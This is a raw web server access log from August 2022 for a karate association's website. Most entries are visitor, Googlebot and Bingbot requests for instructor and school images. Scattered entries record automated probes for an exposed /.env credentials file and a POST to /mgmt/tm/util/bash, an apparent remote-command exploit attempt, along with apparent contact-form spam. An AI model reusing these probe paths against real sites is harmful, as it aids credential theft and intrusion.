::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/grant.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/fortiz.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/clarkb.jpeg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/don.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/rodnak.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/btimlin.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/acohen.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/dokeeffe.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/mlee.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/andrea.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/mbrooks.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/achang.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/amastroianni.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/RuPaster.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/amahalatinia.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:04 +0000] "GET /images/instructors/fnavarro.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/instructors/wkklogo.png HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/fbpic.webp HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/alamedakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/igpic.webp HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/orindakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/harborbaykaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/corpuzkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/nunleykaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/martinezkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/zoomdonkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:05 +0000] "GET /images/schools/zoomsfbakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:15 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:192.184.242.190 - - [13/Aug/2022:07:44:18 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:109.237.103.123 - - [13/Aug/2022:07:44:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.253 - - [13/Aug/2022:07:44:31 +0000] "GET /images/instructors/fnavarro.jpg HTTP/1.1" 200 7268 "-" "Googlebot-Image/1.0"
::ffff:130.255.166.79 - - [13/Aug/2022:07:46:19 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:130.255.166.115 - - [13/Aug/2022:07:46:19 +0000] "GET /humans.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:130.255.166.26 - - [13/Aug/2022:07:46:20 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:130.255.166.115 - - [13/Aug/2022:07:46:20 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:66.249.65.224 - - [13/Aug/2022:07:54:31 +0000] "GET /images/instructors/mbrooks.jpg HTTP/1.1" 200 132490 "-" "Googlebot-Image/1.0"
::ffff:66.249.65.253 - - [13/Aug/2022:08:04:31 +0000] "GET /images/instructors/clarkb.jpeg HTTP/1.1" 200 12183 "-" "Googlebot-Image/1.0"
::ffff:135.125.246.110 - - [13/Aug/2022:08:08:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [13/Aug/2022:08:08:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.224 - - [13/Aug/2022:08:14:31 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 200 35835 "-" "Googlebot-Image/1.0"
::ffff:207.46.13.67 - - [13/Aug/2022:08:17:13 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:46.161.11.238 - - [13/Aug/2022:08:19:27 +0000] "GET / HTTP/1.0" 200 58071 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36/iYA9HebN-7"
::ffff:46.161.11.238 - - [13/Aug/2022:08:19:29 +0000] "POST /sendemail HTTP/1.0" 302 39 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36/iYA9HebN-7"
::ffff:46.161.11.238 - - [13/Aug/2022:08:19:29 +0000] "GET /?msg=sent HTTP/1.0" 200 58471 "http://wadokikai.net/?msg=sent#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36/iYA9HebN-7"
::ffff:66.249.65.224 - - [13/Aug/2022:08:24:31 +0000] "GET /images/instructors/carlos.jpg HTTP/1.1" 200 21431 "-" "Googlebot-Image/1.0"
::ffff:207.46.13.67 - - [13/Aug/2022:08:30:25 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.65.253 - - [13/Aug/2022:08:34:31 +0000] "GET /images/schools/corpuzkaratedo.jpg HTTP/1.1" 200 65837 "-" "Googlebot-Image/1.0"
::ffff:66.249.65.224 - - [13/Aug/2022:08:44:31 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 200 104735 "-" "Googlebot-Image/1.0"
::ffff:66.249.65.251 - - [13/Aug/2022:08:54:31 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Googlebot-Image/1.0"
::ffff:66.249.65.224 - - [13/Aug/2022:09:04:31 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:66.249.65.134 - - [13/Aug/2022:09:05:21 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.254 - - [13/Aug/2022:09:05:21 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.129 - - [13/Aug/2022:09:05:21 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.254 - - [13/Aug/2022:09:05:22 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.115 - - [13/Aug/2022:09:10:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:09:10:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.224 - - [13/Aug/2022:09:14:31 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:157.55.39.13 - - [13/Aug/2022:09:14:45 +0000] "GET /library HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:138.0.67.162 - - [13/Aug/2022:09:15:39 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:66.249.65.253 - - [13/Aug/2022:09:16:32 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/promotions/20220728corpuz.jpg HTTP/1.1" 200 108218 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:07 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:08 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:09 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "-"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:12 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:14 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "-"
::ffff:204.101.161.19 - - [13/Aug/2022:09:25:15 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:66.249.65.253 - - [13/Aug/2022:09:27:28 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:74.208.30.51 - - [13/Aug/2022:09:34:42 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0"
::ffff:135.125.246.110 - - [13/Aug/2022:09:38:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [13/Aug/2022:09:38:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.251 - - [13/Aug/2022:09:40:14 +0000] "GET /images/schools/harborbaykaratedo.jpg HTTP/1.1" 200 77464 "-" "Googlebot-Image/1.0"
::ffff:66.249.65.253 - - [13/Aug/2022:09:43:19 +0000] "GET /events HTTP/1.1" 200 8612 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.253 - - [13/Aug/2022:09:53:05 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:104.248.144.120 - admin [13/Aug/2022:09:56:47 +0000] "POST /mgmt/tm/util/bash HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
::ffff:104.248.144.120 - - [13/Aug/2022:09:56:48 +0000] "GET / HTTP/1.1" 200 58071 "-" "curl/7.58.0"
::ffff:66.249.65.224 - - [13/Aug/2022:10:05:57 +0000] "GET /images/promotions/20220728corpuz.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
